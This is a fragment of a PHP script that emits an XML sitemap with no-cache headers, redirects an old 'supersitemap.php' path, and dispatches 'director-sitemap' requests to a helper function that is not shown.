<?php
error_reporting(0);
ini_set('display_errors', 'off');
if (preg_match('/supersitemap\.php/', $_SERVER['REQUEST_URI'])) {
	header('Location: /sitemap.xml', TRUE, 301);
	exit();
}

header("Expires: -1");
header("Cache-Control: private, no-cache, no-cache=Set-Cookie, proxy-revalidate");
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');
header("Vary: Accept-Encoding");
header('Content-Type: application/xml');

echo '<?xml version="1.0" encoding="UTF-8"?><?xml-stylesheet type="text/xsl" href="//' . $_SERVER["HTTP_HOST"] . '/wp-includes/sitemap/main-sitemap.xsl"?>' . "\r\n";
echo '<urlset xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:image="http://www.google.com/schemas/sitemap-image/1.1" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd" xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\r\n";


if (preg_match('/\/director-sitemap\-/', $_SERVER['REQUEST_URI'])) {

	sitemap_director(200, 200);

	echo '</urlset>';
	exit;
}
